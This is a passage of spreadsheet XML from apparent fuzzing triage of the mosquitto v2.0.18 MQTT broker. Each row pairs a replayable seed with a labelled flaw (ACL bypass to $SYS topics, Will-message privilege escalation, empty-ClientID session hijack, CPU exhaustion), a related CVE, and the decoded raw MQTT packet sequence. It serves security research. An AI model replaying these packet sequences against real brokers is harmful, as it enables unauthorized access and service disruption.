          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000008,sev:4,cat:03c6</t>
        </is>
      </c>
      <c r="B481" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C481" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D4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将种子文件(id:000008,sev:4,cat:03c6)中的REQUEST DATA提取出来(222B)\u000a4.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Sev4\u000a- 违规类别代码: 0x03c6\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E481" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:03c6 ===\u000a大小: 1941B (报告+请求数据)\u000a请求数据: 222B\u000a\u000a---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MQTT请求序列(222B原始二进制) ---\u000aMsg[1]: UNSUBSCRIBE  | raw_header=a20a0002000674657302003c\u000aMsg[2]: TYPE0  | raw_header=000163\u000aMsg[3]: SUBSCRIBE PacketID=13 Topics=[''(零长度!QoS=0)] | raw_header=820b000d000000ffff742f2300\u000aMsg[4]: PUBLISH Topic='test/topic' QoS=1 retain=True payload='\x00\x0e' | raw_header=330e000a746573742f746f706963000e\u000aMsg[5]: PUBLISH Topic='$SYS/broker/upt~me' QoS=2 retain=False payload_len=106B | raw_header=347e0012245359532f62726f6b65722f\u000aMsg[6]: PUBLISH Topic='$SYS/#' QoS=0 retain=True payload='hello' | raw_header=310d0006245359532f2368656c6c6f\u000aMsg[7]: CONNACK session_present=0 reason_code=17 | raw_header=2d020011\u000aMsg[8]: (不完整,31B) raw=262626262626262626262626262626262626262626262626262626c000fc00\u000a(尾部31B): 262626262626262626262626262626262626262626262626262626c000fc00</f>
        <v/>
      </c>
      <c r="F4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1" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J4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82">
      <c r="A482" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000009,sev:3,cat:0002</t>
        </is>
      </c>
      <c r="B482" s="2" t="inlineStr">
        <is>
          <t>权限提升漏洞 - Will消息目标$SYS系统主题</t>
        </is>
      </c>
      <c r="C482" s="2" t="inlineStr">
        <is>
          <t>N/A (新发现: mosquitto Will消息$SYS主题权限提升,此前无相同CVE)</t>
        </is>
      </c>
      <c r="D4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DATA提取出来(189B)\u000a4.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82" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0002 ===\u000a大小: 4630B (报告+请求数据)\u000a请求数据: 189B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: Will message targets $SYS topic (privilege escalation) (Cat=0x0002 Hash=0xc812f950 CVE=N/A)\u000a\u000a--- MQTT请求序列(189B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID='AAAAAAAAA%AAAAAAAAAAAAAA'(24B) clean_session=True keepalive=60s Will=YES WillTopic='will/topic' [自动清理会话] | raw_header=105000044d51545404c6003c00184141\u000aMsg[2]: (不完整,107B) raw=65722f636c69656e74732f636f6e6e656374656426002b766572792f646565702f746f7069632f6c\u000a(尾部107B): 65722f636c69656e74732f636f6e6e656374656426002b766572792f646565702f746f7069632f6c6576656c312f6c657665</f>
        <v/>
      </c>
      <c r="F4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2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2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2" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(权限提升)</t>
        </is>
      </c>
      <c r="J482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8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83">
      <c r="A483" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000009,sev:3,cat:000a</t>
        </is>
      </c>
      <c r="B483" s="2" t="inlineStr">
        <is>
          <t>信息泄露漏洞 - $SYS主题通配符订阅返回系统数据</t>
        </is>
      </c>
      <c r="C483" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类: mosquitto $SYS主题信息泄露)</t>
        </is>
      </c>
      <c r="D4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DATA提取出来(508B)\u000a4.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483" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:000a ===\u000a大小: 4942B (报告+请求数据)\u000a请求数据: 508B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: $SYS wildcard subscription returned system data (Cat=0x000a Hash=0x3cfdd80b CVE=N/A)\u000a\u000a--- MQTT请求序列(508B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID='test-client-with-special!@#$%'(29B) clean_session=True keepalive=60s Will=YES WillTopic='will/topic' [自动清理会话] | raw_header=105500044d51545404c6003c001d7465\u000aMsg[2]: SUBSCRIBE PacketID=615 Topics=['$SYS/#roker/version'(QoS=2), 'very/deep/topic/level1/level2/level3/level4'(QoS=1), '$share/g3/home/ÿ/temperature'(QoS=0)] | raw_header=826502670013245359532f23726f6b65\u000aMsg[3]: CONNACK session_present=0 reason_code=1 | raw_header=22360001740268afa7bb0043d5dec24b\u000aMsg[4]: SUBSCRIBE PacketID=3425 Topics=['$share/g3/home/+/temperature'(QoS=0), '$share/g3/home/+/temperature'(QoS=1), '$share/grp2/sensor/#'(QoS=3)] | raw_header=82570d61001c2473686172652f67332f\u000aMsg[5]: PUBLISH Topic='$share/grp2/sensor/#' QoS=0 retain=False payload='\u000dbXµszacwpppppgppppppppppppppppppp' | raw_header=303800142473686172652f677270322f\u000aMsg[6]: PUBCOMP  | raw_header=7000\u000aMsg[7]: (不完整,113B) raw=70707070707070707070707070707070707070707070707070707070707070707070707070707070\u000a(尾部113B): 7070707070707070707070707070707070707070707070707070707070707070707070707070707070707070707070707070</f>
        <v/>
      </c>
      <c r="F4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8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83" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(敏感信息泄露)</t>
        </is>
      </c>
      <c r="J48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48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484">
      <c r="A484" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000009,sev:3,cat:0082</t>
        </is>
      </c>
      <c r="B484" s="2" t="inlineStr">
        <is>
          <t>权限提升漏洞 - Will消息目标$SYS系统主题</t>
        </is>
      </c>
      <c r="C484" s="2" t="inlineStr">
        <is>
          <t>N/A (新发现: mosquitto Will消息$SYS主题权限提升,此前无相同CVE)</t>
        </is>
      </c>
      <c r="D4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DATA提取出来(399B)\u000a4.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0x0082\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E484" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0082 ===\u000a大小: 5214B (报告+请求数据)\u000a请求数据: 399B\u000a\u000a---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CVE=CVE-2023-3592)\u000a【Sev1】MQTT: Retained message (potential resource exhaustion) (Cat=0x0080 Hash=0xc7f41b6e CVE=CVE-2023-3592)\u000a\u000a--- MQTT请求序列(399B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID='testic\x00\x08will_msg\x00\u0009fuzz_user\x00\u0009'(29B) clean_session=True keepalive=60s Will=YES [自动清理会话] | raw_header=105500044d51545404c6003c001d7465\u000aMsg[2]: PUBREL PacketID=12148 | raw_header=65702f746f7069632f6c6576656c312f\u000aMsg[3]: PUBLISH Topic='?' QoS=2 retain=True payload='' | raw_header=3d0e8a41db5fe0e298ac8240017a2e0a\u000aMsg[4]: CONNACK session_present=246 reason_code=153 | raw_header=2b69f699a8ae41317223e222ca9d220e\u000aMsg[5]: PUBLISH Topic='?' QoS=3 retain=True payload='' | raw_header=372f73656e736f722f23023338001424\u000aMsg[6]: (不完整,26B) raw=60b8c02a84951dc275fcb5a2b039b5ed941b4eed00011c00010f\u000a(尾部26B): 60b8c02a84951dc275fcb5a2b039b5ed941b4eed00011c00010f</f>
        <v/>
      </c>
      <c r="F4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4" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(权限提升)</t>
        </is>
      </c>
      <c r="J48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85">
      <c r="A485" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000009,sev:3,cat:008a</t>
        </is>
      </c>
      <c r="B485" s="2" t="inlineStr">
        <is>
          <t>信息泄露漏洞 - $SYS主题通配符订阅返回系统数据</t>
        </is>
      </c>
      <c r="C485" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类: mosquitto $SYS主题信息泄露)</t>
        </is>
      </c>
      <c r="D4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DATA提取出来(1314B)\u000a4.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485" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:008a ===\u000a大小: 1999B (报告+请求数据)\u000a请求数据: 1314B\u000a\u000a---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MQTT请求序列(1314B原始二进制) ---\u000aMsg[1]: (不完整,1314B) raw=85858585858585858585858585858585858585858585858585858585858585858585858585858585\u000a(尾部1314B): 8585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585</f>
        <v/>
      </c>
      <c r="F4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8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85" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(敏感信息泄露)</t>
        </is>
      </c>
      <c r="J48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48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486">
      <c r="A486" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000009,sev:3,cat:00c0</t>
        </is>
      </c>
      <c r="B486" s="2" t="inlineStr">
        <is>
          <t>资源耗尽漏洞 - MQTT v5过量User Properties属性</t>
        </is>
      </c>
      <c r="C486" s="2" t="inlineStr">
        <is>
          <t>CVE-2021-41039 (同类: mosquitto MQTT v5属性解析CPU耗尽)</t>
        </is>
      </c>
      <c r="D4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DATA提取出来(1650B)\u000a4.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486" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:00c0 ===\u000a大小: 6117B (报告+请求数据)\u000a请求数据: 1650B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: Excessive v5 user-properties (CPU exhaustion risk) (Cat=0x00c0 Hash=0xa8bb2df4 CVE=CVE-2021-41039)\u000a\u000a--- MQTT请求序列(1650B原始二进制) ---\u000aMsg[1]: AUTH  | raw_header=f05500004d51545404c07f0026262626\u000aMsg[2]: (不完整,1563B) raw=26ff2626262626262626262626262626262626262626262626262626262626262626262626262626\u000a(尾部1563B): 26ff262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626</f>
        <v/>
      </c>
      <c r="F4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8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86" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(资源耗尽风险)</t>
        </is>
      </c>
      <c r="J48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48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87">
      <c r="A487" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000009,sev:3,cat:00c2</t>
        </is>
      </c>
      <c r="B487" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C487" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D4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DATA提取出来(1670B)\u000a4.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487" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:00c2 ===\u000a大小: 2266B (报告+请求数据)\u000a请求数据: 1670B\u000a\u000a---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MQTT请求序列(1670B原始二进制) ---\u000aMsg[1]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[2]: CONNECT  | raw_header=1000\u000aMsg[3]: CONNACK session_present=104 reason_code=101 | raw_header=2f2368656c6c6f500200116202001270\u000aMsg[4]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[5]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626002626262626262626\u000aMsg[6]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262676262626262626262626\u000aMsg[7]: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raw_header=26262626262626002626262626262626\u000aMsg[10]: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raw_header=262626262626f0002626262626262626\u000aMsg[17]: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raw_header=26262626262626262626262637262626\u000aMsg[20]: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raw_header=262626262626e0002626262626262626\u000aMsg[23]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262676262626262626262626\u000aMsg[24]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[25]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000a(尾部711B): 2626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626</f>
        <v/>
      </c>
      <c r="F4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7" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J4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8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88">
      <c r="A488" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000009,sev:3,cat:0101</t>
        </is>
      </c>
      <c r="B488" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C488" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D4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DATA提取出来(129B)\u000a4.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488" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0101 ===\u000a大小: 4752B (报告+请求数据)\u000a请求数据: 129B\u000a\u000a---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MQTT请求序列(129B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID=''(0B) clean_session=False keepalive=32512s [持久会话] | raw_header=105500044d51545404c07f000000665c\u000aMsg[2]: TYPE0  | raw_header=0018d709de17a18d81edb56f7daf23d0\u000aMsg[3]: UNSUBACK  | raw_header=bf00\u000aMsg[4]: (不完整,14B) raw=0174fffa60ccd9776e44682d736c\u000a(尾部14B): 0174fffa60ccd9776e44682d736c</f>
        <v/>
      </c>
      <c r="F4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8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88" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J48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8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89">
      <c r="A489" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000009,sev:3,cat:0102</t>
        </is>
      </c>
      <c r="B489" s="2" t="inlineStr">
        <is>
          <t>权限提升漏洞 - Will消息目标$SYS系统主题</t>
        </is>
      </c>
      <c r="C489" s="2" t="inlineStr">
        <is>
          <t>N/A (新发现: mosquitto Will消息$SYS主题权限提升,此前无相同CVE)</t>
        </is>
      </c>
      <c r="D4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89" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0102 ===\u000a大小: 794B (报告+请求数据)\u000a请求数据: 87B\u000a\u000a---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MQTT请求序列(87B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v12 ClientID=''(57890B) clean_session=False keepalive=60s Will=YES [持久会话] | raw_header=105500044d5154540cd4003c23e222ca</f>
        <v/>
      </c>
      <c r="F4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9" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(权限提升)</t>
        </is>
      </c>
      <c r="J48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8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0">
      <c r="A490" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000009,sev:3,cat:0103</t>
        </is>
      </c>
      <c r="B490" s="2" t="inlineStr">
        <is>
          <t>权限提升漏洞 - Will消息目标$SYS系统主题</t>
        </is>
      </c>
      <c r="C490" s="2" t="inlineStr">
        <is>
          <t>N/A (新发现: mosquitto Will消息$SYS主题权限提升,此前无相同CVE)</t>
        </is>
      </c>
      <c r="D4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490" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0103 ===\u000a大小: 5012B (报告+请求数据)\u000a请求数据: 223B\u000a\u000a---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MQTT请求序列(223B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID=''(0B) clean_session=False keepalive=32512s Will=YES [持久会话] | raw_header=105500044d51545404bd7f0000006670\u000aMsg[2]: PUBREL PacketID=19827 | raw_header=6c6c4d73673d77696c6c5f6f6e655f75\u000aMsg[3]: TYPE0  | raw_header=0900\u000aMsg[4]: (不完整,24B) raw=18d709de17a16b81edb50174c3fa60ccd9776e44682d736c\u000a(尾部24B): 18d709de17a16b81edb50174c3fa60ccd9776e44682d736c</f>
        <v/>
      </c>
      <c r="F4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9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90" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(权限提升)</t>
        </is>
      </c>
      <c r="J49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49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1">
      <c r="A491" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000009,sev:3,cat:0181</t>
        </is>
      </c>
      <c r="B491" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C491" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D4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DATA提取出来(2444B)\u000a4.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0x0181\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E491" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0181 ===\u000a大小: 9701B (报告+请求数据)\u000a请求数据: 2444B\u000a\u000a---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CVE=CVE-2014-6116)\u000a\u000a--- MQTT请求序列(2444B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID=''(0B) clean_session=False keepalive=32512s [持久会话] | raw_header=105500044d51545404c07f0000006633\u000aMsg[2]: PUBLISH Topic='?' QoS=1 retain=True payload='' | raw_header=33333333333333333333333333333333\u000aMsg[3]: PUBLISH Topic='?' QoS=1 retain=True payload='' | raw_header=33333333333333333333333333333333\u000aMsg[4]: PUBLISH Topic='?' QoS=1 retain=True payload='' | raw_header=33333333333333333333333333333333\u000aMsg[5]: PUBLISH Topic='?' QoS=1 retain=True payload='' | raw_header=33333333333333333333333333333333\u000aMsg[6]: PUBLISH Topic='?' QoS=1 retain=True payload='' | raw_header=33333333333333333333333333333333\u000aMsg[7]: PUBLISH Topic='?' QoS=1 retain=True payload='' | raw_header=33333333333333333333333333333333\u000aMsg[8]: PUBLISH Topic='?' QoS=1 retain=True payload='' | raw_header=33333333333333333333333333333333\u000aMsg[9]: PUBLISH Topic='?' QoS=1 retain=True payload='' | raw_header=33333333333333333333333333333333\u000aMsg[10]: PUBLISH Topic='?' QoS=1 retain=True payload='' | raw_header=33333333333333333333333333333333\u000aMsg[11]: PUBLISH Topic='?' QoS=1 retain=True payload='' | raw_header=33333333333333333333333333333333\u000aMsg[12]: PUBLISH Topic='?' QoS=1 retain=True payload='' | raw_header=33333333333333333333333333333333\u000aMsg[13]: PUBLISH Topic='?' QoS=1 retain=True payload='' | raw_header=33333333333333333333333333333333\u000aMsg[14]: PUBLISH Topic='?' QoS=1 retain=True payload='' | raw_header=33333333333333333333333333333333\u000aMsg[15]: PUBLISH Topic='?' QoS=1 retain=True payload='' | raw_header=33333333333333333333333333333333\u000aMsg[16]: PUBLISH Topic='?' QoS=1 retain=True payload='' | raw_header=33333333333333333333333333333333\u000aMsg[17]: PUBLISH Topic='?' QoS=1 retain=True payload='' | raw_header=33333333333333333333333333333333\u000aMsg[18]: PUBLISH Topic='?' QoS=1 retain=True payload='' | raw_header=33333333333333333333333333333333\u000aMsg[19]: PUBLISH Topic='?' QoS=1 retain=True payload='' | raw_header=33333333333333333333333333333333\u000aMsg[20]: TYPE0  | raw_header=010101\u000aMsg[21]: TYPE0  | raw_header=010101\u000aMsg[22]: TYPE0  | raw_header=010101\u000aMsg[23]: TYPE0  | raw_header=010101\u000aMsg[24]: TYPE0  | raw_header=010101\u000aMsg[25]: TYPE0  | raw_header=010101\u000a(尾部1385B): 0101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101</f>
        <v/>
      </c>
      <c r="F4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9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91" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J49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9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92">
      <c r="A492" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000009,sev:3,cat:0182</t>
        </is>
      </c>
      <c r="B492" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C492" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D4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92" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0182 ===\u000a大小: 1049B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MQTT请求序列(169B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=63 Topics=['$share/grp2/sensor/#'(QoS=2)] | raw_header=8219003f00142473686172652f677270\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=0 retain=True payload_len=43B | raw_header=31400013245359532f62726f6b65722f\u000aMsg[3]: TYPE0  | raw_header=000123\u000aMsg[4]: CONNECT  | raw_header=1600\u000aMsg[5]: (不完整,71B) raw=0db048f40c6d7f044261adf433ad000a67656e5f76355f7375e8030200641c213bf927ff80aec415\u000a(尾部71B): 0db048f40c6d7f044261adf433ad000a67656e5f76355f7375e8030200641c213bf927ff80aec41500012316000db048f40c</f>
        <v/>
      </c>
      <c r="F4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2" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J4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9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3">
      <c r="A493" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000009,sev:3,cat:0183</t>
        </is>
      </c>
      <c r="B493" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C493" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D4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DATA提取出来(219B)\u000a4.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493" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0183 ===\u000a大小: 1079B (报告+请求数据)\u000a请求数据: 219B\u000a\u000a---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MQTT请求序列(219B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=80 Topics=[] | raw_header=820f0050050b8281d57100001e000174\u000aMsg[2]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=1 retain=True payload_len=160B | raw_header=33bf01001d245359532f62726f6b6572\u000aMsg[3]: (不完整,8B) raw=59ff0b3c7fffe0f0\u000a(尾部8B): 59ff0b3c7fffe0f0</f>
        <v/>
      </c>
      <c r="F4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3" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J4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9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4">
      <c r="A494" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000009,sev:3,cat:01c0</t>
        </is>
      </c>
      <c r="B494" s="2" t="inlineStr">
        <is>
          <t>会话碰撞漏洞 - 空ClientID导致多客户端共享会话</t>
        </is>
      </c>
      <c r="C494" s="2" t="inlineStr">
        <is>
          <t>N/A (MQTT协议会话碰撞模式)</t>
        </is>
      </c>
      <c r="D4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DATA提取出来(260B)\u000a4.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494" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:01c0 ===\u000a大小: 993B (报告+请求数据)\u000a请求数据: 260B\u000a\u000a---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MQTT请求序列(260B原始二进制) ---\u000aMsg[1]: CONNACK session_present=198 reason_code=0 | raw_header=2626c6003c001d746573742d636c6965\u000aMsg[2]: PUBREL PacketID=57927 | raw_header=6c6ce2476f7026472626262626262626\u000aMsg[3]: (不完整,110B) raw=6773b5427373737373737373737c73737373737373737326262626262626ff262626262626263e26\u000a(尾部110B): 6773b5427373737373737373737c73737373737373737326262626262626ff262626262626263e2626261026262626262626</f>
        <v/>
      </c>
      <c r="F4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9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94" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话隔离违规)</t>
        </is>
      </c>
      <c r="J49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49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95">
      <c r="A495" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000009,sev:3,cat:01c1</t>
        </is>
      </c>
      <c r="B495" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C495" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D4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DATA提取出来(10752B)\u000a4.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495" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:01c1 ===\u000a大小: 4816B (报告+请求数据)\u000a请求数据: 10752B\u000a\u000a---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MQTT请求序列(10752B原始二进制) ---\u000aMsg[1]: CONNACK session_present=47 reason_code=47 | raw_header=2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f\u000aMsg[2]: CONNACK session_present=47 reason_code=47 | raw_header=2f2f2f2f80002f2f2f2f3b2f2f2f492f\u000aMsg[3]: CONNACK session_present=47 reason_code=108 | raw_header=2f2f2f6cac4a696170212f272f6c2f05\u000aMsg[4]: CONNACK session_present=36 reason_code=37 | raw_header=2f2f2425e77677696c6c262626262626\u000aMsg[5]: CONNACK session_present=38 reason_code=38 | raw_header=2626262626262626262626262f051100\u000aMsg[6]: CONNACK session_present=47 reason_code=47 | raw_header=2f2f2f2f2f2f2f2f2f2f2f2f776e4451\u000aMsg[7]: CONNACK  | raw_header=2f012f\u000aMsg[8]: CONNACK session_present=47 reason_code=47 | raw_header=2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f\u000aMsg[9]: TYPE0  | raw_header=0400\u000aMsg[10]: PUBREL PacketID=27743 | raw_header=696c6c5f312f6c6576656c322f6c6539\u000aMsg[11]: (不完整,3685B) raw=dee240232425e77677696c6c2f051100056161616161616161616161616161616161616161616161\u000a(尾部3685B): dee240232425e77677696c6c2f051100056161616161616161616161616161616161616161616161616161ff006161616161</f>
        <v/>
      </c>
      <c r="F4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9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95" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J49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49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496">
      <c r="A496" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000009,sev:3,cat:0206</t>
        </is>
      </c>
      <c r="B496" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C496" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D4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DATA提取出来(288B)\u000a4.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496" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0206 ===\u000a大小: 793B (报告+请求数据)\u000a请求数据: 288B\u000a\u000a---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MQTT请求序列(288B原始二进制) ---\u000aMsg[1]: AUTH  | raw_header=ff00\u000aMsg[2]: TYPE0  | raw_header=010101\u000aMsg[3]: TYPE0  | raw_header=010101\u000aMsg[4]: TYPE0  | raw_header=010101\u000aMsg[5]: TYPE0  | raw_header=010101\u000aMsg[6]: TYPE0  | raw_header=010101\u000aMsg[7]: TYPE0  | raw_header=010101\u000aMsg[8]: TYPE0  | raw_header=010101\u000aMsg[9]: TYPE0  | raw_header=010101\u000aMsg[10]: TYPE0  | raw_header=010101\u000aMsg[11]: TYPE0  | raw_header=010101\u000aMsg[12]: SUBSCRIBE PacketID=2199 Topics=[] | raw_header=824508971e0baeeecd1a260000001424\u000aMsg[13]: PUBLISH Topic='$SYS/broker/version' QoS=0 retain=False payload_len=61B | raw_header=38520013245359532f62726f6b65722f\u000aMsg[14]: TYPE0  | raw_header=010101\u000aMsg[15]: TYPE0  | raw_header=010101\u000aMsg[16]: TYPE0  | raw_header=010101\u000aMsg[17]: TYPE0  | raw_header=010101\u000aMsg[18]: TYPE0  | raw_header=010101\u000aMsg[19]: TYPE0  | raw_header=010101\u000aMsg[20]: TYPE0  | raw_header=010101\u000aMsg[21]: TYPE0  | raw_header=010101\u000aMsg[22]: TYPE0  | raw_header=010101\u000aMsg[23]: TYPE0  | raw_header=010101\u000aMsg[24]: TYPE0  | raw_header=010100\u000aMsg[25]: SUBSCRIBE PacketID=63498 Topics=['aib/c/d/e/f/g/~/i/e'(QoS=0)] | raw_header=8218f80a00136169622f632f642f652f\u000a(尾部42B): 8210170b2f400101008218000a0013612f622f632f642f652f662f672f682f692f6a00680a10239e2088</f>
        <v/>
      </c>
      <c r="F4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6" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J4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9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7">
      <c r="A497" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000009,sev:3,cat:020e</t>
        </is>
      </c>
      <c r="B497" s="2" t="inlineStr">
        <is>
          <t>信息泄露漏洞 - $SYS主题通配符订阅返回系统数据</t>
        </is>
      </c>
      <c r="C497" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类: mosquitto $SYS主题信息泄露)</t>
        </is>
      </c>
      <c r="D4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DATA提取出来(310B)\u000a4.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497" s="2">
